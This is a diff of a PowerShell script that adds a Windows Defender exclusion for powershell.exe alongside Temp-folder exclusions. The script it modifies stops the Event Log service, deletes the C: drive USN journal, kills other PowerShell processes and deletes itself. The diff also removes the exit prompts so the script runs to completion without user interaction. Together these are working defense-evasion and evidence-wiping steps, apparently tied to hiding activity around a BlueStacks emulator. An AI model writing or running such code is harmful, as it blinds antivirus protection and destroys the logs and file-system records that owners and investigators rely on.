@@ -57,7 +57,12 @@ try {
     Write-Host "[+] System Temp folder excluded: $env:WINDIR\Temp" -ForegroundColor Green
 } catch { Write-Host "[-] Failed to add system Temp exclusion: $_" -ForegroundColor Yellow }
 
-Write-Host "[*] Exclusions added (only Temp folders). Continuing..." -ForegroundColor Cyan
+try {
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
+    Write-Host "[+] powershell.exe process excluded." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add PowerShell process exclusion: $_" -ForegroundColor Yellow }
+
+Write-Host "[*] Exclusions added (Temp folders + powershell.exe). Continuing..." -ForegroundColor Cyan
 
 # ========== STOP EVENT LOG SERVICE ==========
 try {
@@ -78,7 +83,7 @@ if ($emuProcess) {
     $emulatorPaths = @(
         "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
         "C:\Program Files\BlueStacks_msi2\HD-Player.exe",
-        "C:\Program Files (x86)\BlueStacks\HD-Player.exe"
+        "C:\Program Files (x86)\BlueStacks\HD-Player.exe",
         "C:\Program Files\BlueStacks_msi5\HD-Player.exe"
     )
     $emulatorExe = $emulatorPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
@@ -303,12 +308,10 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 Write-Host "[*] Attempting to clear USN Journal on C: drive..." -ForegroundColor Cyan
 
 try {
-    # Try to delete the journal; capture output and exit code
     $output = fsutil usn deletejournal /D C: 2>&1
     if ($LASTEXITCODE -eq 0) {
         Write-Host "[+] USN Journal cleared successfully." -ForegroundColor Green
     } else {
-        # If it fails, check if it's because there is no journal
         if ($output -match "no USN journal") {
             Write-Host "[!] No USN Journal exists on C: drive." -ForegroundColor Yellow
         } else {
@@ -319,35 +322,37 @@ try {
     Write-Host "[-] Exception occurred: $_" -ForegroundColor Red
 }
 
-Write-Host "[*] Test finished. Press any key to exit..."
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-
 # ------------------------------------------------------------
-# REMOVE WINDOWS DEFENDER EXCLUSIONS (safe, exact-match)
+# REMOVE WINDOWS DEFENDER EXCLUSIONS (only the added items)
 # ------------------------------------------------------------
 Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
 
-# Define the exact exclusions we added earlier (use dynamic paths)
+# Define the exact exclusions that were added
 $addedPaths = @(
-    "$env:USERPROFILE\Desktop",          # instead of hardcoded billa
-    "C:\",
-    "$env:TEMP",
-    "$env:WINDIR\Temp"
+    [System.IO.Path]::GetFullPath("$env:TEMP"),
+    [System.IO.Path]::GetFullPath("$env:WINDIR\Temp")
 )
 $addedProcesses = @("powershell.exe")
 
-# Get current Defender preferences
 $prefs = Get-MpPreference
 
-# --- Remove folder exclusions ---
+# Helper to normalize path (remove trailing backslash, case-insensitive)
+function Normalize-Path($p) {
+    if ($p) { return [System.IO.Path]::GetFullPath($p).TrimEnd('\') }
+    return $null
+}
+
+# --- Remove folder exclusions that match our list ---
 if ($prefs.ExclusionPath) {
-    foreach ($path in $prefs.ExclusionPath) {
-        if ($addedPaths -contains $path) {
+    $normalizedAdded = $addedPaths | ForEach-Object { Normalize-Path $_ }
+    foreach ($exPath in $prefs.ExclusionPath) {
+        $normEx = Normalize-Path $exPath
+        if ($normalizedAdded -contains $normEx) {
             try {
-                Remove-MpPreference -ExclusionPath $path -ErrorAction Stop
-                Write-Host "[+] Removed exclusion: $path" -ForegroundColor Green
+                Remove-MpPreference -ExclusionPath $exPath -ErrorAction Stop
+                Write-Host "[+] Removed exclusion: $exPath" -ForegroundColor Green
             } catch {
-                Write-Host "[-] Failed to remove $path : $_" -ForegroundColor Yellow
+                Write-Host "[-] Failed to remove $exPath : $_" -ForegroundColor Yellow
             }
         }
     }
@@ -355,15 +360,15 @@ if ($prefs.ExclusionPath) {
     Write-Host "[!] No folder exclusions found." -ForegroundColor Gray
 }
 
-# --- Remove process exclusions ---
+# --- Remove process exclusions that match our list ---
 if ($prefs.ExclusionProcess) {
-    foreach ($proc in $prefs.ExclusionProcess) {
-        if ($addedProcesses -contains $proc) {
+    foreach ($exProc in $prefs.ExclusionProcess) {
+        if ($addedProcesses -contains $exProc) {
             try {
-                Remove-MpPreference -ExclusionProcess $proc -ErrorAction Stop
-                Write-Host "[+] Removed process exclusion: $proc" -ForegroundColor Green
+                Remove-MpPreference -ExclusionProcess $exProc -ErrorAction Stop
+                Write-Host "[+] Removed process exclusion: $exProc" -ForegroundColor Green
             } catch {
-                Write-Host "[-] Failed to remove process $proc : $_" -ForegroundColor Yellow
+                Write-Host "[-] Failed to remove process $exProc : $_" -ForegroundColor Yellow
             }
         }
     }
@@ -411,20 +416,25 @@ try {
     net start eventlog 2>$null
 } catch { }
 
-# ------------------------------------------------------------
-# REMOVE EVERY POWERSHELL WINDOW FROM BACKGROUND
-# ------------------------------------------------------------
-Start-Sleep -Seconds 2
-Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $pid -and $_.Id -ne $p.Id } | ForEach-Object {
+# Wait a moment for processes to settle
+Start-Sleep -Seconds 3
+
+# Kill any remaining PowerShell processes except this one
+Write-Host "[*] Killing leftover PowerShell processes..." -ForegroundColor Cyan
+Get-Process -Name "powershell" -ErrorAction SilentlyContinue |
+Where-Object { $_.Id -ne $pid } |
+ForEach-Object {
     try {
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Killed leftover PowerShell PID: $($_.Id)" -ForegroundColor Gray
     } catch { }
 }
-
-Write-Host "[*] Main script finished. Press any key to close this window..."
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 # Self-delete the script file
 try {
     cmd /c "del /f /q `"$PSCommandPath`"" 2>$null
 } catch { }
+
+Write-Host "[*] All done. Exiting in 2 seconds..."
+Start-Sleep -Seconds 2
+# No ReadKey – exits automatically
